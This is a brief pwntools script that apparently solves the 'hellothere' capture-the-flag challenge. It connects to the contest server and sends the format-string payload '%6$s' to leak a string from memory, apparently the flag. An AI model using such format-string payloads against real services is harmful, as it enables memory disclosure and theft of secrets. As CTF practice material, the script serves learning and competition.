from pwn import *

elf = ELF('hellothere')
context.update(binary=elf, log_level='critical')

host = 'pwn-2021.duc.tf'
port = 31918
p = remote(host, port)
# p = elf.process()

payload = b'%6$s'
p.recvuntil(b'name?\n')
p.sendline(payload)
p.recvuntil(b'there, ')
s = p.recvline().strip()
print(s)

p.close()
